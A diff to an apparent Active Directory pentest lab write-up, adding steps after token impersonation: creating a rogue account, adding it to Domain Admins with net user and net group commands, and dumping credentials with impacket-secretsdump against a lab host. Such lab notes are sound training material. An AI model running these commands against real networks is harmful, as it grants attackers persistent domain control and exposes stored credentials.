@@ -154,14 +154,35 @@ Payload: windows/x64/meterpreter/reverse_tcp
 #### 2.Executing Incognito  
 'Load incognito'.  
 Confirm shell access has been achieved with 'shell'.  
+
 ![image](https://github.com/user-attachments/assets/8660a23d-ca3f-46d6-bef6-84c0c276d272)
 
-List tokens of users that had logged in to the machine using list_tokens -u
+List tokens of users that had logged in to the machine using list_tokens -u  
+
 ![image](https://github.com/user-attachments/assets/721a908f-38fc-4e29-94c5-638359fcc335)
 
 use token by using impersonate-token <domain\\user>
 in the below example impersonate fcastle, terminate and rev2self (revert back to original user token) and then proceed to impersonate marvel\administrator.  
-![image](https://github.com/user-attachments/assets/51f0b4b7-c0db-4ec7-a292-1320c638934d)
+
+![image](https://github.com/user-attachments/assets/51f0b4b7-c0db-4ec7-a292-1320c638934d)  
+
+Now that we are in marvel\administrator lets use this oppurtunity to create a new account, provide it with admin rghts and allocate it into the domains group.
+'net user' to view what accounts reside on the system (THE PUNISHER).
+
+![image](https://github.com/user-attachments/assets/5c8f48fe-f8d3-4d66-99d2-68cd4510361b)
+
+add new account:
+add into Domain Admins group:
+
+    C:\Windows\system32>net user /add hawkeye Password1@ /domain
+    C:\Windows\system32>net group "Domain Admins" hawkeye /ADD /DOMAIN
+
+#### 3.Dumping SAM with new account using secretsdump
+Now that we have a new rouge account with admin right created, we can use it to dump secrets - impacket-secretsdump MARVEL.local/hawkeye:'Password1@'@192.168.64.138  
+
+![image](https://github.com/user-attachments/assets/73b12f15-1d2b-4121-a8d4-795cd32ca9b8)  
+
+Mission success.
 
 ---
 
